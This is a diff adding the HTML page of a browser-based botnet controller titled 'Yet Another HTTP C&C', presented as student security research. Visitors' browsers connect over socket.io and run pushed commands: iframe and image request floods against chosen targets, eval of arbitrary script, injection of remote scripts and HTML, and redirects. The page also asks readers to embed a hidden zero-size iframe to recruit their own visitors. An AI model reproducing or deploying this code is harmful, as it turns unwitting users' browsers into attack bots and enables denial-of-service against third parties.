@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<!--
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with this program.  If not, see <http://www.gnu.org/licenses/>.
+-->
+<html>
+     <head>
+          <title>Yet Another HTTP C&amp;C</title>
+          <script type="text/javascript">
+          var currentCommand = {{currentCommand}};
+          </script>
+          <script src="/socket.io/socket.io.js"></script>
+          <script src="/hllowc.js"></script>
+          <script src="http://code.jquery.com/jquery.js"></script>
+          <script type="text/javascript">
+               'use strict';
+               (function () {
+                    var correctHttp = function (url) {
+                         // Works well for `https`
+                         if (!url.startsWith('http')) {
+                              return 'http://' + url;
+                         } else {
+                              return url;
+                         }
+                    };
+                    
+                    var slave = (function () {
+                         var commands = {
+                              iframe: function (target, interval) { // iframe load attack
+                                   interval = interval || 20;
+                                   HLLOWC.startIFrame(target, interval);
+                              },
+                              img: function (target, interval) { // img load load attack
+                                   interval = interval || 20;
+                                   HLLOWC.startImg(target, interval);
+                              },
+                              evaluate: function (script) {
+                                   eval(script);
+                              },
+                              alert: function (message) {
+                                   alert(message);
+                              },
+                              log: function (message) {
+                                   console.log(message);
+                              },
+                              appendsrc: function (src) {
+                                   var js = document.createElement('script');
+                                   js.src = src;
+                                   var first = document.getElementsByTagName('script')[0];
+                                   first.parentNode.insertBefore(js, first);
+                              },
+                              append: function (html) {
+                                   var s = document.createElement('div');
+                                   s.innerHTML = html;
+                                   document.getElementsByTagName('body')[0].appendChild(s);
+                              },
+                              stop: function () {
+                                   HLLOWC.stop();
+                              },
+                              go: function (url) {
+                                   window.location = url;
+                              }
+                         };
+                         
+                         return function (name, args) {
+                              setTimeout(function () {  // avoid exceptions                              
+                                   if (name && commands.hasOwnProperty(name)) {
+                                        commands[name].apply(commands, args);
+                                   }
+                              }, 1);
+                         };
+                    }());
+
+                    var socket = io.connect();
+                    socket.on('command', slave);
+                    
+                    if (currentCommand) {
+                         slave(currentCommand.name, currentCommand.args);
+                    }
+               } ());
+          </script>
+     </head>
+     <body>
+          <h1>Hello, bot!</h1>
+          <p>
+               I'm your controller. You're in a part of a security research. <br />
+               Please contact omar.al.dolaimy on google mail, if you have any questions. <br />
+               I'm a student at <em>PSUT.edu.jo</em>.
+          </p>
+          
+          <h2>Spread the Code!</h2>
+          <p>
+               If you're interesting in supporting the project. Please add the following code into a site YOU OWN:
+          </p>
+          <pre>
+&lt;!-- This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with this program.  If not, see <http://www.gnu.org/licenses/>.
+!--&gt;
+&lt;iframe src=&quot;http://httpcnc.jit.su/&quot; style=&quot;border: 0; width: 0; height: 0&quot;&gt;&lt;/iframe&gt;
+          </pre>
+          <div id="imgContainer"></div>
+          <div id="frameContainer"></div>
+          
+          <script type="text/javascript">
+            var _gaq = _gaq || [];
+            _gaq.push(['_setAccount', 'UA-37606235-1']);
+            _gaq.push(['_trackPageview']);
+
+            (function() {
+              var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+              ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+              var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+            })();
+
+          </script>
+     </body>
+</html>
